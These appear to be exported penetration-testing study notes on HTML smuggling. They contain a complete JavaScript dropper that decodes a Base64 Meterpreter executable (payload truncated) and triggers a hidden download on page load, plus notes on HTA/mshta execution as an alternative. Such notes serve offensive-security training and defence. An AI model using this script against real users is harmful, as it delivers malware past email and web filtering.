<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>HTML smuggling</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>HTML smuggling</h1><br/><p><h2>Intro</h2><ul><li>• <small>• </small><strong><small>an attacker embeds link in email</small></strong></li><li><small>user visits the webpage =&gt; JS code will use HTML smuggling to save the dropper file</small></li><li><small>This technique leverages the HTML549 anchor tag download attribute,</small></li><li><small>First, we&#39;ll create a Base64 Meterpreter executable and store it as a Blob4 inside of a JavaScript variable. Next, we&#39;ll use that Blob to create a URL file object that simulates a file on the web server. Finally, we&#39;ll create an invisible anchor tag that will trigger a download action once the victim loads the page.</small></li></ul></p><p></p><p><div class="codebox"><pre><span style="color:#7f0044;font-weight:400">&lt;html&gt;</span><br />    <span style="color:#7f0044;font-weight:400">&lt;body&gt;</span><br />        <span style="color:#7f0044;font-weight:400">&lt;script&gt;</span><br />        function base64ToArrayBuffer(base64) {<br />            var binary_string = window.atob(base64);<br />            var len = binary_string.length;<br />            var bytes = new Uint8Array( len );<br />            for (var i = 0; i &lt; len; i++) { bytes[i] = binary_string.charCodeAt(i);<br />            }<br />            return bytes.buffer;<br />            }<br />        <span style="color:#0088ff;font-weight:400">// base64 msftstaged.exe</span><br />        var file =&#39;TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAA...<br />        var data = base64ToArrayBuffer(file);<br />        var blob = new Blob([data], {type: &#39;octet/stream&#39;});<br />        var fileName = &#39;msfstaged.exe&#39;;<br />        var a = document.createElement(&#39;a&#39;);<br />        document.body.appendChild(a);<br />        a.style = &#39;display: none&#39;;<br />        var url = window.URL.createObjectURL(blob);<br />        a.href = url;<br />        a.download = fileName;<br />        a.click();<br />        window.URL.revokeObjectURL(url);<br />        <span style="color:#7f0044;font-weight:400">&lt;/script&gt;</span><br />    <span style="color:#7f0044;font-weight:400">&lt;/body&gt;</span><br /><span style="color:#7f0044;font-weight:400">&lt;/html&gt;</span></pre></div><ul><li>• <small>• cons: alert on victim browser</small></li><li><strong><small>needs user to click on executable </small></strong></li></ul></p><p></p><p></p><p><h2>Alternative: hta</h2></p><p><ul><li>if url are being clicked </li><li>try:<ul><li>hta : dynamic html + vbscript/jscript </li><li>html application</li><li>executed using mshta.exe</li><li>only works on I.E and some implementation of Edge </li><li>hta (html application) runs as a fully trusted app (add files/edit registeries...)</li></ul></li><li>goto <a href="03_-_Client_Side_Code_Execution_With_Office--HTA_-_mshta_19.html">HTA app</a></li></ul></p></div>
</body>
</html>
